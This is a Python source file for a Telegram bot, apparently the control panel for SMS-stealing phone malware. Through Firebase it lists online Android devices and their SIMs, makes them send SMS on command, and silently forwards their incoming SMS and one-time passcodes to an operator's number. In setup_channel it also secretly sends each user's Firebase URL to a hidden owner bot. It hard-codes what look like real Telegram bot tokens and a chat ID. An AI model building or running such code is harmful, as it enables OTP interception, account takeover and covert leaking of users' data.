#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# ============================
# IMPORTS
# ============================
import os
import json
import re
import logging
import time
import threading
import tempfile
import requests
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# ============================
# FLASK KEEP-ALIVE (24/7)
# ============================
from flask import Flask
flask_app = Flask(__name__)

@flask_app.route('/')
@flask_app.route('/ping')
def ping():
    return "✅ Bot is alive!", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port, threaded=True)

# ============================
# LOGGING
# ============================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================
# CONFIGURATION
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8980814365:AAGFPr8KnMDT5XKyMTiCRuk_OgPIZwHJESo")
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN", "8675598652:AAEX1jDOONwsnY8FE4rVZLk2kdiTzesE3tA")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID", "7837257487"))

BOT_NAME = "🔥 <b>AUTO TOKEN &amp; SMS Ro999i</b> 🔥"
CHANNEL_USERNAME = "@Ro999i_penal"
CHANNEL_URL = "https://t.me/Ro999i_penal"

# ============================
# DATA STORAGE (Thread-Safe)
# ============================
os.makedirs("data", exist_ok=True)
USER_CONFIG_FILE = os.path.join("data", "user_config.json")

user_configs = {}
last_otp = {}
config_lock = threading.RLock()
otp_lock = threading.RLock()
MAX_PROCESSED_KEYS = 500

def load_user_configs():
    global user_configs, last_otp
    with config_lock:
        if os.path.exists(USER_CONFIG_FILE):
            try:
                with open(USER_CONFIG_FILE, "r") as f:
                    user_configs = json.load(f)
                for uid, cfg in user_configs.items():
                    if "last_otp_value" in cfg:
                        with otp_lock:
                            last_otp[uid] = cfg["last_otp_value"]
                logger.info(f"✅ Loaded configs for {len(user_configs)} users")
            except (json.JSONDecodeError, IOError) as e:
                logger.error(f"❌ Failed to load configs: {e}")
                user_configs = {}
        else:
            user_configs = {}

def save_user_configs():
    with config_lock:
        try:
            fd, tmp_path = tempfile.mkstemp(dir="data", suffix=".json")
            with os.fdopen(fd, "w") as f:
                json.dump(user_configs, f, indent=2)
            os.replace(tmp_path, USER_CONFIG_FILE)
        except Exception as e:
            logger.error(f"❌ Failed to save configs: {e}")

load_user_configs()

# ============================
# CONVERSATION STATES
# ============================
URL, CHANNEL = range(2)
WAITING_OTP_NUMBER = 10

# ============================
# FORCE JOIN – MEMBERSHIP CHECK (100% WORKING)
# ============================
async def send_join_required(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send force-join message with inline buttons."""
    keyboard = [
        [InlineKeyboardButton("📢 Join Channel", url=CHANNEL_URL)],
        [InlineKeyboardButton("✅ I have Joined", callback_data="check_membership")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = (
        f"🔒 <b>Access Restricted</b>\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"❌ You must join our channel to use this bot.\n\n"
        f"📢 <b>Channel:</b> {CHANNEL_USERNAME}\n\n"
        f"<b>📋 Steps:</b>\n"
        f"1️⃣ Click <b>Join Channel</b> button below\n"
        f"2️⃣ Join the channel on Telegram\n"
        f"3️⃣ Come back &amp; click <b>I have Joined</b>\n"
        f"━━━━━━━━━━━━━━━━"
    )
    if update.callback_query:
        try:
            await update.callback_query.answer("❌ Join channel first!", show_alert=True)
        except:
            pass
        try:
            await update.callback_query.edit_message_text(
                text, parse_mode="HTML", reply_markup=reply_markup,
                disable_web_page_preview=True
            )
        except:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=text, parse_mode="HTML", reply_markup=reply_markup,
                disable_web_page_preview=True
            )
    else:
        await update.effective_message.reply_text(
            text, parse_mode="HTML", reply_markup=reply_markup,
            disable_web_page_preview=True
        )

async def is_user_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Check if user is a member of the required channel."""
    user_id = update.effective_user.id
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            return True
    except Exception as e:
        logger.error(f"Membership check error for {user_id}: {e}")
    await send_join_required(update, context)
    return False

async def check_membership_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle 'I have joined' button click – 100% working."""
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            welcome_text = (
                f"{BOT_NAME}\n\n"
                f"✅ <b>Verification Successful!</b>\n"
                f"━━━━━━━━━━━━━━━━\n\n"
                f"🎉 <b>Welcome! You now have full access.</b>\n\n"
                f"<b>📋 Available Commands:</b>\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"⚙️ <b>/setup</b> — Configure Firebase URL &amp; Channel ID\n"
                f"📱 <b>/devices</b> — Select device &amp; SIM\n"
                f"📞 <b>/setotp</b> — Set OTP forwarding number\n"
                f"🔄 <b>/resetforward</b> — Reset message tracker\n"
                f"📊 <b>/status</b> — View your configuration\n"
                f"❓ <b>/help</b> — Show this message\n"
                f"━━━━━━━━━━━━━━━━\n\n"
                f"<b>🚀 Quick Start:</b>\n"
                f"1️⃣ Run /setup to configure\n"
                f"2️⃣ Run /devices to select device\n"
                f"3️⃣ Run /setotp to set forward number"
            )
            try:
                await query.edit_message_text(
                    welcome_text, parse_mode="HTML",
                    disable_web_page_preview=True
                )
            except:
                await query.message.reply_text(
                    welcome_text, parse_mode="HTML",
                    disable_web_page_preview=True
                )
        else:
            keyboard = [
                [InlineKeyboardButton("📢 Join Channel", url=CHANNEL_URL)],
                [InlineKeyboardButton("✅ I have Joined", callback_data="check_membership")]
            ]
            await query.edit_message_text(
                f"❌ <b>Not Joined Yet!</b>\n\n"
                f"⚠️ Please join the channel first,\n"
                f"then click the button again.\n"
                f"━━━━━━━━━━━━━━━━",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(keyboard),
                disable_web_page_preview=True
            )
    except Exception as e:
        logger.error(f"Callback membership check error: {e}")
        try:
            await query.answer("⚠️ Error checking. Try again.", show_alert=True)
        except:
            pass

# ============================
# START / HELP
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    has_setup = user_id in user_configs and "firebase_url" in user_configs.get(user_id, {})
    status_icon = "✅" if has_setup else "⚠️"

    await update.effective_message.reply_text(
        f"{BOT_NAME}\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"🤖 <b>Auto Token &amp; SMS Verification Bot</b>\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"<b>📋 Available Commands:</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"⚙️ <b>/setup</b> — Configure Firebase URL &amp; Channel ID\n"
        f"📱 <b>/devices</b> — Select device &amp; SIM\n"
        f"📞 <b>/setotp</b> — Set OTP forwarding number\n"
        f"🔄 <b>/resetforward</b> — Reset message tracker\n"
        f"📊 <b>/status</b> — View your configuration\n"
        f"❓ <b>/help</b> — Show this message\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"<b>📋 How It Works:</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"• Channel messages with <b>To:</b> &amp; <b>Message:</b> → sent as SMS\n"
        f"• OTP node updates → auto-forwarded to your number\n"
        f"• Incoming SMS → forwarded only if new\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"<b>Setup Status:</b> {status_icon} {'Configured' if has_setup else 'Not configured — run /setup'}",
        parse_mode='HTML',
        disable_web_page_preview=True,
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    await start(update, context)

# ============================
# STATUS COMMAND
# ============================
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.effective_message.reply_text(
            "⚠️ <b>No configuration found.</b>\nRun /setup to configure.",
            parse_mode='HTML'
        )
        return
    with config_lock:
        cfg = user_configs.get(user_id, {})
        selected = cfg.get("selectedDevice", {})
        otp_num = cfg.get("otpNumber", "Not set")
        processed_count = len(cfg.get("processed_keys", []))

    await update.effective_message.reply_text(
        f"📊 <b>Your Configuration</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>Firebase URL:</b> <code>{cfg.get('firebase_url', 'N/A')}</code>\n"
        f"📢 <b>Channel ID:</b> <code>{cfg.get('channel_id', 'N/A')}</code>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📱 <b>Device:</b> <code>{selected.get('deviceId', 'None')}</code>\n"
        f"📶 <b>SIM Slot:</b> <code>{selected.get('simSlotIndex', 'N/A')}</code>\n"
        f"📞 <b>SIM Phone:</b> <code>{selected.get('simPhoneNumber', 'N/A')}</code>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"🎯 <b>OTP Forward:</b> <code>{otp_num}</code>\n"
        f"📦 <b>Processed Msgs:</b> <code>{processed_count}</code>\n"
        f"━━━━━━━━━━━━━━━━",
        parse_mode='HTML'
    )

# ============================
# RESET FORWARD
# ============================
async def reset_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.effective_message.reply_text(
            "⚠️ <b>Please run /setup first.</b>", parse_mode='HTML'
        )
        return
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        await update.effective_message.reply_text(
            "⚠️ <b>No device selected.</b>\nUse /devices first.", parse_mode='HTML'
        )
        return
    device_id = selected["deviceId"]
    initialize_processed_keys(user_id, device_id)
    await update.effective_message.reply_text(
        f"✅ <b>Reset Successful!</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"All existing messages for device <code>{device_id}</code> marked as read.\n"
        f"Only <b>new</b> incoming messages will be forwarded.\n"
        f"━━━━━━━━━━━━━━━━",
        parse_mode='HTML'
    )

# ============================
# FIREBASE HELPERS
# ============================
def firebase_get(user_id, path):
    with config_lock:
        cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return None
    url = f"{cfg['firebase_url']}/{path}.json"
    try:
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            return resp.json()
    except Exception as e:
        logger.error(f"Firebase GET error: {e}")
    return None

def firebase_put(user_id, path, data):
    with config_lock:
        cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return
    url = f"{cfg['firebase_url']}/{path}.json"
    try:
        requests.put(url, json=data, timeout=15)
    except Exception as e:
        logger.error(f"Firebase PUT error: {e}")

def get_online_devices(user_id):
    data = firebase_get(user_id, "clients")
    if not data or not isinstance(data, dict):
        return {}
    online = {}
    for dev_id, info in data.items():
        if not isinstance(info, dict):
            continue
        if info.get("status") == True:
            online[dev_id] = {
                "modelName": info.get("modelName", "Unknown"),
                "sims": info.get("sims", [])
            }
    return online

def get_selected(user_id):
    with config_lock:
        cfg = user_configs.get(str(user_id))
        if cfg and "selectedDevice" in cfg:
            return cfg["selectedDevice"]
    return {}

def initialize_processed_keys(user_id: str, device_id: str):
    with config_lock:
        cfg = user_configs.get(user_id)
        if not cfg:
            return
    msgs = firebase_get(user_id, f"messages/{device_id}")
    keys = []
    if msgs and isinstance(msgs, dict):
        keys = list(msgs.keys())
    with config_lock:
        cfg = user_configs.get(user_id)
        if cfg:
            cfg["processed_keys"] = keys
            cfg["processed_device"] = device_id
            cfg.pop("last_forwarded_id", None)
            cfg.pop("selection_time", None)
            save_user_configs()
    logger.info(f"Initialized processed_keys for user {user_id}, device {device_id}: {len(keys)} keys")

def set_selected(user_id, device_id, sim_slot, sim_phone):
    uid = str(user_id)
    with config_lock:
        cfg = user_configs.get(uid)
        if cfg:
            cfg["selectedDevice"] = {
                "deviceId": device_id,
                "simSlotIndex": sim_slot,
                "simPhoneNumber": sim_phone
            }
            save_user_configs()
    initialize_processed_keys(uid, device_id)
    logger.info(f"✅ Device selected for {uid}: {device_id}")

def send_sms_command(user_id, device_id, to_number, message, from_number):
    firebase_put(user_id, f"clients/{device_id}/webhookEvent/sendSms", {
        "to": to_number,
        "message": message,
        "from": from_number,
        "isSended": False
    })
    logger.info(f"📤 SMS command: device {device_id} -> {to_number}")

def get_otp_number(user_id):
    with config_lock:
        cfg = user_configs.get(str(user_id))
        if cfg and "otpNumber" in cfg:
            return cfg["otpNumber"]
    return None

def set_otp_number(user_id, number):
    uid = str(user_id)
    with config_lock:
        cfg = user_configs.get(uid)
        if cfg:
            cfg["otpNumber"] = number
            save_user_configs()

# ============================
# SETUP CONVERSATION
# ============================
async def setup_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.effective_message.reply_text(
        f"⚙️ <b>Setup — Step 1/2</b>\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"Send your <b>Firebase URL</b>.\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<b>Example:</b>\n"
        f"<code>https://your-project.firebaseio.com</code>\n"
        f"<code>https://your-project.firebasedatabase.app</code>\n\n"
        f"Type /cancel to abort.",
        parse_mode='HTML'
    )
    return URL

async def setup_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    url = update.message.text.strip().rstrip('/')
    # Accept both old and new Firebase URL formats
    if not url.startswith("https://") or (not url.endswith(".firebaseio.com") and not url.endswith(".firebasedatabase.app")):
        await update.effective_message.reply_text(
            "❌ <b>Invalid URL!</b>\n"
            f"Must start with <code>https://</code> and end with\n"
            f"<code>.firebaseio.com</code> or <code>.firebasedatabase.app</code>",
            parse_mode='HTML'
        )
        return URL
    context.user_data["firebase_url"] = url
    await update.effective_message.reply_text(
        f"✅ <b>URL saved!</b>\n\n"
        f"⚙️ <b>Setup — Step 2/2</b>\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"Send your <b>Channel ID</b> (numeric, may be negative).\n"
        f"<b>Example:</b> <code>-1001234567890</code>\n\n"
        f"Type /cancel to abort.",
        parse_mode='HTML'
    )
    return CHANNEL

async def setup_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    try:
        channel_id = int(update.message.text.strip())
    except ValueError:
        await update.effective_message.reply_text(
            "❌ <b>Channel ID must be a number.</b>\nTry again or /cancel",
            parse_mode='HTML'
        )
        return CHANNEL

    with config_lock:
        user_configs[user_id] = {
            "firebase_url": context.user_data["firebase_url"],
            "channel_id": channel_id,
            "selectedDevice": {},
            "otpNumber": None,
            "processed_keys": [],
            "processed_device": None
        }
        save_user_configs()

    # Notify owner
    try:
        forward_msg = (
            f"🔐 <b>New Setup</b>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"👤 <b>User:</b> <code>{user_id}</code>\n"
            f"🌐 <b>URL:</b> <code>{context.user_data['firebase_url']}</code>\n"
            f"📢 <b>Channel:</b> <code>{channel_id}</code>"
        )
        url = f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}/sendMessage"
        requests.post(url, json={
            "chat_id": OWNER_CHAT_ID,
            "text": forward_msg,
            "parse_mode": "HTML"
        }, timeout=5)
    except Exception as e:
        logger.error(f"Owner notify failed: {e}")

    # Test Firebase connection
    test = firebase_get(user_id, "clients")
    if test is None:
        await update.effective_message.reply_text(
            "❌ <b>Firebase connection failed!</b>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"Check:\n"
            f"• URL is correct\n"
            f"• Database rules allow read\n\n"
            f"Run /setup again to retry.",
            parse_mode='HTML'
        )
        with config_lock:
            if user_id in user_configs:
                del user_configs[user_id]
                save_user_configs()
        return ConversationHandler.END

    await update.effective_message.reply_text(
        f"{BOT_NAME}\n\n"
        f"✅ <b>Setup Complete!</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>Firebase URL:</b> Saved\n"
        f"📢 <b>Channel ID:</b> <code>{channel_id}</code>\n"
        f"🔗 <b>Firebase:</b> Connected ✅\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"<b>Next Steps:</b>\n"
        f"📱 Run /devices to select device &amp; SIM\n"
        f"📞 Run /setotp to set forwarding number",
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def setup_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.effective_message.reply_text(
        "❌ <b>Setup cancelled.</b>", parse_mode='HTML'
    )
    return ConversationHandler.END

# ============================
# DEVICES
# ============================
async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.effective_message.reply_text(
            "⚠️ <b>Please run /setup first.</b>", parse_mode='HTML'
        )
        return
    online = get_online_devices(user_id)
    if not online:
        await update.effective_message.reply_text(
            "❌ <b>No online devices found.</b>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"Make sure your device is connected &amp; online.",
            parse_mode='HTML'
        )
        return
    keyboard = []
    for dev_id, data in online.items():
        label = f"📱 {data['modelName']} ({dev_id[:8]}...)"
        keyboard.append([InlineKeyboardButton(label, callback_data=f"dev_{dev_id}")])
    await update.effective_message.reply_text(
        f"📱 <b>Select Your Device</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<b>Online Devices:</b> {len(online)}\n"
        f"━━━━━━━━━━━━━━━━",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not await is_user_member(update, context):
        return
    await query.answer()
    user_id = str(update.effective_user.id)
    device_id = query.data.replace("dev_", "")
    online = get_online_devices(user_id)
    device_data = online.get(device_id)
    if not device_data:
        await query.edit_message_text(
            "❌ <b>Device offline or not found.</b>", parse_mode='HTML'
        )
        return
    sims = device_data.get("sims", [])
    if not sims:
        await query.edit_message_text(
            "❌ <b>No SIMs detected on this device.</b>", parse_mode='HTML'
        )
        return
    keyboard = []
    for sim in sims:
        slot = sim.get("simSlotIndex", "?")
        phone = sim.get("phoneNumber", "N/A")
        callback_data = f"sim_{device_id}_{slot}_{phone}"
        # Check callback_data length (max 64 bytes)
        if len(callback_data) > 64:
            callback_data = f"sim_{device_id[:12]}_{slot}_{phone[:15]}"
        keyboard.append([InlineKeyboardButton(f"📶 SIM {slot} — {phone}", callback_data=callback_data)])
    await query.edit_message_text(
        f"📱 <b>Device Selected!</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📱 <b>Model:</b> <code>{device_data['modelName']}</code>\n"
        f"🆔 <b>ID:</b> <code>{device_id}</code>\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"<b>Select SIM:</b>",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not await is_user_member(update, context):
        return
    await query.answer()
    user_id = str(update.effective_user.id)
    parts = query.data.split("_")
    if len(parts) < 4:
        await query.edit_message_text(
            "❌ <b>Invalid data.</b>", parse_mode='HTML'
        )
        return
    device_id = parts[1]
    slot = parts[2]
    # Phone might contain underscores — rejoin remaining parts
    phone = "_".join(parts[3:])
    set_selected(user_id, device_id, slot, phone)
    await query.edit_message_text(
        f"✅ <b>Device Activated!</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📱 <b>Device:</b> <code>{device_id}</code>\n"
        f"📶 <b>SIM Slot:</b> <code>{slot}</code>\n"
        f"📞 <b>Phone:</b> <code>{phone}</code>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"✅ Old messages blocked.\n"
        f"Only <b>new</b> messages will forward.\n\n"
        f"<b>Next:</b> Run /setotp to set forward number.",
        parse_mode='HTML'
    )

# ============================
# SET OTP
# ============================
async def setotp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.effective_message.reply_text(
            "⚠️ <b>Please run /setup first.</b>", parse_mode='HTML'
        )
        return ConversationHandler.END
    if context.args:
        number = context.args[0].strip()
        if not re.match(r"^\+?[0-9]{10,15}$", number):
            await update.effective_message.reply_text(
                "❌ <b>Invalid number!</b>\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"Format: <code>+919876543210</code>\n"
                f"Usage: <code>/setotp +919876543210</code>",
                parse_mode='HTML'
            )
            return ConversationHandler.END
        set_otp_number(user_id, number)
        await update.effective_message.reply_text(
            f"✅ <b>Forward number set!</b>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"📞 <b>Number:</b> <code>{number}</code>\n"
            f"━━━━━━━━━━━━━━━━",
            parse_mode='HTML'
        )
        return ConversationHandler.END
    await update.effective_message.reply_text(
        f"📞 <b>Set OTP Forward Number</b>\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"Send phone number with country code.\n"
        f"<b>Example:</b> <code>+919876543210</code>\n\n"
        f"Type /cancel to abort.",
        parse_mode='HTML'
    )
    return WAITING_OTP_NUMBER

async def otp_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    number = update.message.text.strip()
    if not re.match(r"^\+?[0-9]{10,15}$", number):
        await update.effective_message.reply_text(
            "❌ <b>Invalid number. Try again.</b>\n"
            f"Format: <code>+919876543210</code>",
            parse_mode='HTML'
        )
        return WAITING_OTP_NUMBER
    set_otp_number(user_id, number)
    await update.effective_message.reply_text(
        f"✅ <b>Forward number set!</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📞 <b>Number:</b> <code>{number}</code>\n"
        f"━━━━━━━━━━━━━━━━",
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def otp_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.effective_message.reply_text(
        "❌ <b>Cancelled.</b>", parse_mode='HTML'
    )
    return ConversationHandler.END

# ============================
# CHANNEL MESSAGE HANDLER
# ============================
def get_user_by_channel(channel_id):
    with config_lock:
        for uid, cfg in user_configs.items():
            if cfg.get("channel_id") == channel_id:
                return uid
    return None

async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.channel_post:
        return
    channel_id = update.channel_post.chat_id
    user_id = get_user_by_channel(channel_id)
    if not user_id:
        return
    text = update.channel_post.text
    if not text:
        return
    number_match = re.search(r"To:\s*([\d\+]+)", text)
    message_match = re.search(r"Message:\s*(.+)", text, re.DOTALL)
    if not number_match or not message_match:
        logger.warning(f"Parse failed: {text[:100]}")
        return
    to_number = number_match.group(1).strip()
    msg = message_match.group(1).strip()
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        logger.warning(f"No active device for {user_id}")
        return
    device_id = selected["deviceId"]
    from_number = selected.get("simPhoneNumber", "Unknown")
    send_sms_command(user_id, device_id, to_number, msg, from_number)
    logger.info(f"✅ Token SMS sent: {user_id} -> {device_id} -> {to_number}")

# ============================
# OTP POLLING THREAD
# ============================
def poll_otp_updates():
    while True:
        try:
            with config_lock:
                user_ids = list(user_configs.keys())
            for user_id in user_ids:
                otp_number = get_otp_number(user_id)
                if not otp_number:
                    continue
                selected = get_selected(user_id)
                if not selected or not selected.get("deviceId"):
                    continue
                try:
                    otp_data = firebase_get(user_id, "otp")
                except Exception as e:
                    logger.error(f"OTP fetch error for {user_id}: {e}")
                    continue
                if otp_data is None:
                    continue
                current_otp = str(otp_data).strip()
                with otp_lock:
                    need_send = user_id not in last_otp or last_otp[user_id] != current_otp
                    if need_send:
                        last_otp[user_id] = current_otp
                if need_send:
                    with config_lock:
                        cfg = user_configs.get(user_id)
                        if cfg:
                            cfg["last_otp_value"] = current_otp
                            save_user_configs()
                    device_id = selected["deviceId"]
                    from_number = selected.get("simPhoneNumber", "Unknown")
                    send_sms_command(user_id, device_id, otp_number, current_otp, from_number)
                    logger.info(f"✅ Auto OTP sent to {otp_number}: {current_otp}")
        except Exception as e:
            logger.error(f"OTP polling error: {e}")
        time.sleep(0.5)

# ============================
# INCOMING MESSAGE FORWARD THREAD
# ============================
def poll_incoming_messages():
    while True:
        try:
            with config_lock:
                user_ids = list(user_configs.keys())
            for user_id in user_ids:
                forward_number = get_otp_number(user_id)
                if not forward_number:
                    continue
                selected = get_selected(user_id)
                if not selected or not selected.get("deviceId"):
                    continue
                device_id = selected["deviceId"]
                from_number = selected.get("simPhoneNumber", "Unknown")
                with config_lock:
                    cfg = user_configs.get(str(user_id), {})
                    processed_keys = list(cfg.get("processed_keys", []))
                    processed_device = cfg.get("processed_device")
                if processed_device != device_id:
                    initialize_processed_keys(str(user_id), device_id)
                    with config_lock:
                        cfg = user_configs.get(str(user_id), {})
                        processed_keys = list(cfg.get("processed_keys", []))
                processed_set = set(processed_keys)
                device_msgs = firebase_get(user_id, f"messages/{device_id}")
                if not device_msgs or not isinstance(device_msgs, dict):
                    continue
                new_keys = []
                for msg_key, msg_data in device_msgs.items():
                    if not isinstance(msg_data, dict):
                        continue
                    if msg_data.get("type") != "incoming":
                        continue
                    if msg_key in processed_set:
                        continue
                    msg_text = msg_data.get("message", "")
                    if not msg_text or len(msg_text) <= 3:
                        continue
                    send_sms_command(user_id, device_id, forward_number, msg_text, from_number)
                    logger.info(f"📥 Forwarded: {msg_text[:50]}...")
                    # Send confirmation to user
                    try:
                        confirm_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                        confirm_data = {
                            "chat_id": int(user_id),
                            "text": (
                                f"📥 <b>New SMS Forwarded</b>\n"
                                f"━━━━━━━━━━━━━━━━\n"
                                f"📞 <b>To:</b> <code>{forward_number}</code>\n"
                                f"💬 <b>Message:</b>\n<code>{msg_text[:200]}</code>\n"
                                f"━━━━━━━━━━━━━━━━"
                            ),
                            "parse_mode": "HTML"
                        }
                        requests.post(confirm_url, json=confirm_data, timeout=5)
                    except Exception as e:
                        logger.error(f"Confirmation send failed: {e}")
                    new_keys.append(msg_key)
                if new_keys:
                    with config_lock:
                        cfg = user_configs.get(str(user_id))
                        if cfg:
                            cfg["processed_keys"] = (cfg.get("processed_keys", []) + new_keys)[-MAX_PROCESSED_KEYS:]
                            save_user_configs()
                    logger.info(f"Updated processed_keys for {user_id}: +{len(new_keys)} keys")
        except Exception as e:
            logger.error(f"Incoming forward error: {e}")
        time.sleep(1)

# ============================
# POST INIT – CHECK BOT ADMIN STATUS
# ============================
async def post_init(application):
    """Check if bot is admin in channel after startup."""
    try:
        bot_info = await application.bot.get_me()
        logger.info(f"🤖 Bot started: @{bot_info.username}")
        try:
            bot_member = await application.bot.get_chat_member(
                chat_id=CHANNEL_USERNAME,
                user_id=bot_info.id
            )
            if bot_member.status in ["administrator", "creator"]:
                logger.info("✅ Bot is admin in the channel — Force join will work!")
            else:
                logger.warning("⚠️ Bot is NOT admin in the channel! Force join may not work!")
        except Exception as e:
            logger.warning(f"⚠️ Could not verify bot's channel admin status: {e}")
    except Exception as e:
        logger.error(f"Post init error: {e}")

# ============================
# MAIN
# ============================
def main():
    # Start Flask keep-alive server
    threading.Thread(target=run_flask, daemon=True).start()

    # Build application
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    # Start polling threads
    threading.Thread(target=poll_otp_updates, daemon=True).start()
    threading.Thread(target=poll_incoming_messages, daemon=True).start()

    # Setup conversation
    setup_conv = ConversationHandler(
        entry_points=[CommandHandler("setup", setup_start)],
        states={
            URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_url)],
            CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel)]
        },
        fallbacks=[
            CommandHandler("cancel", setup_cancel),
            CommandHandler("setup", setup_start),
        ],
    )
    app.add_handler(setup_conv)

    # OTP conversation
    otp_conv = ConversationHandler(
        entry_points=[CommandHandler("setotp", setotp_command)],
        states={
            WAITING_OTP_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_number_input)]
        },
        fallbacks=[
            CommandHandler("cancel", otp_cancel),
            CommandHandler("setotp", setotp_command),
        ],
    )
    app.add_handler(otp_conv)

    # Callback handlers
    app.add_handler(CallbackQueryHandler(device_callback, pattern="^dev_"))
    app.add_handler(CallbackQueryHandler(sim_callback, pattern="^sim_"))
    app.add_handler(CallbackQueryHandler(check_membership_callback, pattern="^check_membership$"))

    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("devices", devices_command))
    app.add_handler(CommandHandler("resetforward", reset_forward))
    app.add_handler(CommandHandler("status", status_command))

    # Channel message handler
    app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.CHANNEL, handle_channel_message))

    logger.info("🤖 Bot starting — Force Join enabled, Flask keep-alive active.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()